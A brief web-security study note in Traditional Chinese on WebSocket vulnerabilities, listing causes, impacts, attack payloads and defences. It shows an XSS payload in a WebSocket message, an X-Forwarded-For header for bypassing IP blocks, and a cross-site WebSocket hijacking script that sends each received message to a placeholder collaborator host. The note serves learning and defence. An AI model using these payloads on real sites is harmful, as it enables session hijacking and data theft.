# WebSocket
## 成因
* 未預期的方法操作，導致出現漏洞。
    * 攔截修改內容。
    * 重送。
    * 連結以斷線的 socket。
## 影響
* 前端未驗證輸入，造成 XSS、SQLi 等攻擊。
* Cross-site WebSockets hijacking。
## 攻擊方法
### 修改內容導致 XSS
```
{"message":"<img src=1 onerror='alert(1)'>"}
```
### X-Forwarded-For 繞過 ip 封鎖
```
X-Forwarded-For: 1.1.1.1
```
### Cross-Site WebSocket hijacking
* WebSocket 版本的 CSRF。
* 成因是網站在 WebSocket handshake 僅根據 cookie 驗證，沒有其他額外驗證。
* 最後達成任意操作與取得資訊。
```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
## 防禦方法
* 使用 `wss://` 協定 (WebSockets over TLS)
* 指定 url，不包含使用者可控參數
* 加入 CSRF Token，避免 Cross-Site WebSocket hijacking
* 對雙向輸入皆進行驗證，避免 XSS、SQLi
---
###### tags: `web security`